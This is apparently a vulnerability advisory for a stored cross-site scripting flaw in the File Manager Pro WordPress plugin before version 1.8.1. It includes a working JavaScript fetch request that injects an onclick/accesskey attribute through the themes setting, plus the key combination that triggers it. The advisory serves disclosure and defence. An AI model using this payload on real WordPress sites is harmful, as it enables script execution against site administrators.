## WordPress Plugin Vulnerabilities

# File Manager Pro < 1.8.1 - Admin+ Stored Cross-Site Scripting

### Description

The plugin does not adequately validate and escape some inputs, leading to XSS by high-privilege users.

### Proof of Concept

As an admin, open the File Manager and run the following JS code:
fetch("http://localhost:10008/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
},
"body": "action=selector\_themes&themesValue=dark-slim\"+accesskey=X+onclick=alert(/XSS/)+\"&nonce=" + wpData.nonce,
"method": "POST",
"mode": "cors",
"credentials": "include"
});
As a super-admin, open the File Manager and press the Access Key combination (Firefox for Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X) to trigger the XSS.
